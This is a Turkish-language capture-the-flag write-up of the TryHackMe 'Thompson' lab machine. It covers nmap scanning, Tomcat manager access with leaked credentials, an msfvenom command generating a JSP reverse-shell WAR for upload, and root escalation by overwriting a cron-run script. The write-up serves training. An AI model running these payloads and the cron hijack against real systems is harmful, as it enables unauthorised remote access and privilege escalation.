---
title: 'TryHackMe | Thompson WriteUp'
author: appdone
categories: [TryHackMe Challenges]
render_with_liquid: false
media_subpath: /images/tryhackme_thompson/
image:
  path: logo.webp
---

Bu yazımda, TryHackMe platformunda yer alan “Thompson” isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
$ nmap -sC -sV -T4 10.10.84.205
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 22 (SSH), 8009 (Apache Jserv) ve 8080 (Apache Tomcat) olmak üzere üç portun açık olduğunu öğreniyoruz. 8080 numaralı HTTP servisini açtıktan sonra “manager app” butonuna tıkladım ve kullanıcı bilgilerini girebilmemiz için bir pop-up açıldı. Burada iptal butonuna tıkladığımızda aşağıdaki hata sayfası ile karşılaşıyoruz. Burada bir kullanıcı adı ve parola bulunuyor.

![](1.webp){: width="900" height="500" }

Bu kullanıcı bilgilerini kullanarak sisteme giriş yapabiliyoruz. Sayfayı biraz aşağıya kaydırdığımızda .war dosyalarını yükleyebileceğimiz bir form ile karşılaşıyoruz.

![](2.webp){: width="1200" height="600" }

Msfvenom ile reverse shell alabileceğim bir .war dosyası oluşturalım.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1234 -f war > shell.war
```

Dosyayı oluşturduktan sonra yükleyelim.

![](3.webp){: width="1000" height="600" }

Yükledikten sonra uygulamalar listesinde oluşturduğumuz dosyanın adını göreceğiz. Ona tıklamadan önce belirttiğimiz port’u dinlemeye alalım.

Sisteme girdikten sonra /home/jack dizini altından herhangi bir kısıtlama olmadan ilk bayrağı alabiliyoruz. Aynı dizin içerisinde id.sh ve test.txt adında iki dosya bulunuyor. /etc/crontab dosyasını kontrol ettiğimizde ise id.sh dosyasını 1 dk ara ile sürekli çalıştırdığını görüyoruz.

```console
(Meterpreter 1)(/) > cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
#
```

id.sh dosyanın içeriğini değiştirebiliyoruz. İçerisine /root/root.txt dosyasındaki bayrağı alabilmek için bir komut girdim ve beklemeye başladım. Bir süre sonra dosyayı çalıştırdı ve belirttiğim test.txt dosyasına bayrağı yazdırdı.

```console
tomcat@ubuntu:/home/jack$ echo "cat /root/root.txt > test.txt" > id.sh
tomcat@ubuntu:/home/jack$ cat test.txt
d89d539***3ae7ca3a
```

Bunun yerine reverse shell alabileceğimiz bir komut girip dinlediğimiz bir port üzerinden shell alabiliriz. Değişiklik olması amacıyla biraz daha kolay yoldan gittim.
